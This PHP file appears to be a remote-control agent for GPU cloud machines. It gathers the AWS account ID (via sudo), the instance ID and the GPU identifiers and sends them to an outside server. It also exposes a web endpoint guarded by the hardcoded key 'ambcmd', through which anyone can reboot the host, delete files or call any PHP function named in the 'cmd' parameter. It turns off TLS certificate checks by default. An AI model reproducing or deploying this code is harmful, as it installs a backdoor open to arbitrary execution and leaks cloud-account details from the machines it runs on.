<?php
//amb.api.code.start
//@ambver=v6.26@
function curls($url,$data = false,$type="get", &$err_msg = null, $timeout = 20, $cert_info = array())
{
    $type = strtoupper($type);
    if ($type == 'GET' && is_array($data)) {
        $data = http_build_query($data);
    }

    $option = array();

    if ( $type == 'POST' ) {
        $option[CURLOPT_POST] = 1;
    }
    if ($data) {
        if ($type == 'POST') {
            $option[CURLOPT_POSTFIELDS] = $data;
        } elseif ($type == 'GET') {
            $url = strpos($url, '?') !== false ? $url.'&'.$data :  $url.'?'.$data;
        }
    }

    $option[CURLOPT_URL]            = $url;
    $option[CURLOPT_FOLLOWLOCATION] = TRUE;
    $option[CURLOPT_MAXREDIRS]      = 4;
    $option[CURLOPT_RETURNTRANSFER] = TRUE;
    $option[CURLOPT_TIMEOUT]        = $timeout;

    //设置证书信息
    if(!empty($cert_info) && !empty($cert_info['cert_file'])) {
        $option[CURLOPT_SSLCERT]       = $cert_info['cert_file'];
        $option[CURLOPT_SSLCERTPASSWD] = $cert_info['cert_pass'];
        $option[CURLOPT_SSLCERTTYPE]   = $cert_info['cert_type'];
    }

    //设置CA
    if(!empty($cert_info['ca_file'])) {
        // 对认证证书来源的检查，0表示阻止对证书的合法性的检查。1需要设置CURLOPT_CAINFO
        $option[CURLOPT_SSL_VERIFYPEER] = 1;
        $option[CURLOPT_CAINFO] = $cert_info['ca_file'];
    } else {
        // 对认证证书来源的检查，0表示阻止对证书的合法性的检查。1需要设置CURLOPT_CAINFO
        $option[CURLOPT_SSL_VERIFYPEER] = 0;
    }

    $ch = curl_init();
    curl_setopt_array($ch, $option);
    $response = curl_exec($ch);
    $curl_no  = curl_errno($ch);
    $curl_err = curl_error($ch);
    curl_close($ch);

    // error_log
    if($curl_no > 0) {
        if($err_msg !== null) {
            $err_msg = '('.$curl_no.')'.$curl_err;
        }
    }
    return $response;
}
function update_amb_api()
{

}
function send_debug($fun)
{
    global $cmd_ver;
    global $cloud_id;
    global $aws_id;
    global $instance_id;
    global $gpu_id;
    global $ambkey;
    $api='http://io.ues.cn/coin/index/debug';
    $post=[
        'ambkey'=>$ambkey,
        'fun'=>$fun,
        'aws_id'=>$aws_id,
        'instance_id'=>$instance_id,
        'gpu_id'=>$gpu_id,
        'cmd_ver'=>$cmd_ver,
        'cloud_id'=>$cloud_id,
    ];
    $res=curls($api,$post);
    echo $res;
}


$cmd_ver="v6.26";//版本文件
$ambkey="ambcmd";
$path='/www/wwwroot/io.net';

$cloud_id=trim(@shell_exec('cloud-id'));
$instance_id=trim(@shell_exec('cat /var/lib/cloud/data/instance-id'));
$gpu_id="";
$gpu_type="";
$account_info=json_decode(trim(@shell_exec('sudo aws sts get-caller-identity 2>&1')),true);
$aws_id=isset($account_info['Account'])?$account_info['Account']:'';
$gpuinfo=@shell_exec('nvidia-smi --query-gpu=uuid --format=csv');
$pattern = '/GPU(.*)/si';
if (@preg_match($pattern, $gpuinfo, $matches)) {
    $gpu_id = isset($matches[0]) ? trim($matches[0]) : "";
}
else{
    $gpu_id=$instance_id;
}
$output = @shell_exec('nvidia-smi --query-gpu=gpu_name --format=csv,noheader,nounits');
if (@preg_match('/NVIDIA\s+(\S+)/', trim($output), $matches)) {
    $gpu_type=isset($matches[1])?trim($matches[1]):'';
}
if (php_sapi_name() === 'cli') {
    if ($aws_id!="" && $instance_id!="" && $gpu_id!="" && $cloud_id!="")
    {
        include_once 'amb.api.php';
        //心跳
        life();
    }
    else{
        send_debug('cli');
    }
} else {
    //验证key
    $act=isset($_REQUEST['act'])?$_REQUEST['act']:"";
    $key=isset($_REQUEST['key'])?$_REQUEST['key']:"";
    $cmd=isset($_REQUEST['cmd'])?$_REQUEST['cmd']:"";
    if ($key!=$ambkey)
    {
        echo 'hacker';exit;
    }
    include_once 'amb.api.php';
    switch ($act)
    {
        case "reinstall":
            if ($aws_id!="" && $instance_id!="" && $gpu_id!="" && $cloud_id!="") {
                re_install_io();
            }
            else{
                send_debug('reinstall');
            }
            break;
        case "test":
            print_r($aws_id.'__'.$instance_id.'__'.$gpu_id.'__'.$path.'__'.$cloud_id);
            break;
        case "reboot":
            @shell_exec('sudo reboot');
            break;
        case "update":
            //更新php文件
            update_amb_api();
            break;
        case "rmfile":
            //更新php文件
            rm_file();
            break;
        default:
            if ($cmd!="")
            {
                call_user_func($cmd);
            }
            break;
    }

    echo 'ok';
}
//amb.api.code.end
